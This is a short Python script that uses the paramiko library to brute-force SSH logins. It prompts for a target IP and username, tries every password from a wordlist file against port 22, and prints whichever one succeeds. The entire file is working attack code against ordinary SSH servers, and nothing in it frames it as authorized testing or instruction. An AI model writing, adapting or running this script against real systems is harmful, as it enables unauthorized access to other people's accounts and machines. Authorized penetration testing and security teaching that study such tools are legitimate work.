import paramiko
import sys
import os

target_ip = str(input("Enter target IP Address :"))
username = str(input("Enter the username :"))

def ssh_connect(password):
    code = 0
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(target_ip, port=22, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    ssh.close()
    return code

with open("wordlist2.txt", "r") as file :
    for line in file.readlines():
        password = line.strip()

        try :
            response = ssh_connect(password)

            if response == 0:
                print("Password :", password)
                exit(0)
            elif response == 1:
                print("No Luck in finding the password")
        except Exception as e:
            print(e)
        pass
